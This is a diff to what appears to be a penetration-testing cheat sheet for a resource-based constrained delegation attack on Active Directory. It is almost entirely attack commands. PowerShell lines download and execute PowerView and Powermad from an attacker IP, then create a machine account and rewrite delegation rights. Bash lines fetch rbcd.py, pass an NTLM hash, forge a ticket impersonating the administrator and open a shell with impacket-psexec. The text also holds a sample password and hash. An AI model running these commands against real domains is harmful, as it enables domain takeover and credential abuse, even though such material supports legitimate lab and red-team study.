@@ -1197,19 +1197,13 @@ https://github.com/Kevin-Robertson/Powermad
 <br/>
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
 
+##### PowerShell
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Powermad.ps1')
 
 New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString 'Pass12345!' -AsPlainText -Force) -Verbose 
-
 Get-DomainComputer TEST
-
-wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
-python3 rbcd.py -dc-ip 192.168.171.175 -t RESOURCEDC -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
-impacket-getST -spn cifs/ResourceDC.resourced.local resourced.local/TEST\$:'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175
-export KRB5CCNAME=./Administrator.ccache
-
 
 $ComputerSid = Get-DomainComputer TEST -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -1226,6 +1220,18 @@ Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofot
 
 klist
 ls \\msdsspn_fqdn\c$
+```
+##### Bash
+```bash
+impacket-addcomputer -computer-name 'TEST$' -computer-pass 'Pass12345!' -dc-ip 10.129.205.35 resourced.local/rbcd_user
+
+wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
+python3 rbcd.py -dc-ip 192.168.171.175 -t DC01 -f 'TEST' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
+impacket-getST -spn cifs/DC01.resourced.local resourced.local/TEST\$:'Pass12345!' -impersonate administrator -dc-ip 192.168.171.175
+export KRB5CCNAME=./Administrator.ccache
+
+# vim /etc/hosts DC01 (SPN)
+impacket-psexec -k -no-pass resourced.local/administrator@DC01.resourced.local
 ```
 
 #### nopac
